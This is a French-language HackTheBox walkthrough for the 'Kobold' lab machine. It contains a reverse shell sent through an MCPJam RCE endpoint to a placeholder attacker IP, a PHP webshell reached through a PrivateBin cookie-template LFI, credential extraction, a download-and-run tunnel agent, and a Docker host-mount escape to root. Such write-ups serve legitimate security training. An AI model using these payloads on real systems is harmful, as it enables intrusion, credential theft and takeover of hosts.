🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Kobold — HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2ff7f3683782c3525c5ac9ed275cc989.png" width="120"/>
<div>

**Difficulté**: Easy  
**OS**: Linux  
**Type**: Web / Docker  

</div>
</div>

---

## Résumé de la chaîne d'exploitation

```
nmap → kobold.htb
  → ffuf → mcp.kobold.htb + bin.kobold.htb
  → CVE-2026-23744 (MCPJam RCE) → shell ben
  → CVE-2025-49596 (PrivateBin LFI via cookie template)
  → Credential extraction (conf.php)
  → Arcane Admin Access
  → Docker container creation (root mount)
  → ROOT
```

---

## Énumération

### Scan Nmap

```bash
nmap -sV -sC 10.129.xxx.xxx -oN scan.txt
```

Ports ouverts :

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu |
| 80   | HTTP    | nginx 1.24.0 (redirect → HTTPS) |
| 443  | HTTPS   | nginx 1.24.0 — `kobold.htb` |

Le certificat TLS révèle le domaine `kobold.htb` et le wildcard `*.kobold.htb`.

### Ajout au /etc/hosts

```bash
echo "10.129.xxx.xxx kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### Découverte de sous-domaines (ffuf)

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://10.129.xxx.xxx \
  -H "Host: FUZZ.kobold.htb" \
  -k -mc 200,301,302,403 -fs 154
```

Résultat :
```
mcp   [Status: 200, Size: 466]
```

- `mcp.kobold.htb` → MCPJam Inspector

---

## Foothold — CVE-2026-23744 (MCPJam RCE)

### Identification de la version

En visitant `https://mcp.kobold.htb` → Settings → **MCPJam Version: v1.4.2**

Cette version est vulnérable à la **CVE-2026-23744** : l'endpoint `/api/mcp/connect` exécute arbitrairement les commandes passées dans le champ `command` sans aucune vérification d'authentification.

### Exploitation

**Listener :**
```bash
nc -lvnp 4444
```

**Payload reverse shell (base64) :**
```bash
echo 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1' | base64

curl -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "echo <BASE64> | base64 -d | bash"],
      "env": {}
    },
    "serverId": "pwn"
  }'
```

Shell obtenu en tant que `ben`.

---

## User Flag

```bash
ben@kobold:~$ cat user.txt
********************************
```

---

## Énumération post-exploitation

### Informations clés

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

cat /etc/group | grep docker
# docker:x:111:alice

ss -tlnp
# 127.0.0.1:8080  → PrivateBin (container Docker)
# 127.0.0.1:6274  → MCPJam Inspector
# *:3552          → Arcane (gestionnaire Docker)
```

### Nginx — sous-domaines internes

```bash
cat /etc/nginx/sites-enabled/*
```

- `bin.kobold.htb` → proxy vers `127.0.0.1:8080` (PrivateBin dans Docker)
- `mcp.kobold.htb` → proxy vers `127.0.0.1:6274` (MCPJam)

### Groupe operator — accès à /privatebin-data

```bash
find / -group operator -readable 2>/dev/null
```

Le groupe `operator` (dont fait partie `ben`) donne accès en lecture/écriture à `/privatebin-data/data/` (`drwxrwxrwx`).

---

## Privesc 1 — CVE-2025-49596 (PrivateBin LFI via cookie template)

### Contexte

PrivateBin **2.0.2** avec `templateselection = true` dans la config. La CVE-2025-49596 exploite le cookie `template` pour inclure arbitrairement des fichiers PHP via un path traversal relatif depuis le dossier `tpl/`.

### Écriture d'un webshell

Depuis le shell `ben`, on écrit un webshell PHP dans le dossier world-writable :

```bash
echo '<?php system($_GET["cmd"]); ?>' > /privatebin-data/data/shell.php
```

### Déclenchement du LFI

```bash
curl -sk --cookie "template=../data/shell" \
  "https://bin.kobold.htb/?cmd=id"
# → uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

Le webshell fonctionne dans le contexte du container PrivateBin.

### Extraction des credentials

```bash
curl -sk --cookie "template=../data/shell" \
  "https://bin.kobold.htb/?cmd=cat+/srv/cfg/conf.php"
```

Dans la config PrivateBin, une section MySQL commentée mais active contient :

```ini
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
usr = "privatebin"
pwd = "ComplexP@ssword********"
```

---

## Privesc 2 — Accès Arcane Admin

### Tunnel Ligolo-ng

Le port 3552 (Arcane) n'est accessible que depuis localhost. On monte un tunnel :

**Kali :**
```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

**Shell ben :**
```bash
cd /tmp
curl http://<IP_ATTAQUANT>:8080/agent -o agent && chmod +x agent
./agent -connect <IP_ATTAQUANT>:11601 -ignore-cert
```

**CLI Ligolo :**
```
session → start
listener_add --addr 0.0.0.0:3552 --to 127.0.0.1:3552 --tcp
```

### Login Arcane

On accède à `http://127.0.0.1:3552` dans le navigateur.

```
Username: arcane
Password: ComplexP@ssword********
```

Interface : **Arcane v1.13.0** — gestionnaire Docker avec accès au socket `unix:///var/run/docker.sock`.

---

## Privesc 3 — Docker Escape → ROOT

### Création du container malveillant

Dans Arcane → Containers → **Create Container** :

**Basic :**
- Container Name: `pwn`
- Image: `privatebin/nginx-fpm-alpine:2.0.2` (déjà disponible localement)
- User: `root`
- I/O : Allocate TTY, Attach stdin

**Volumes (Text Format) :**
```
/:/hostfs
```

**Network & Security :**
- Privileged mode

### Récupération du flag root

Depuis le shell intégré Arcane (onglet Shell du container) :

```sh
/var/www # whoami
root
/var/www # cat /hostfs/root/root.txt
********************************
```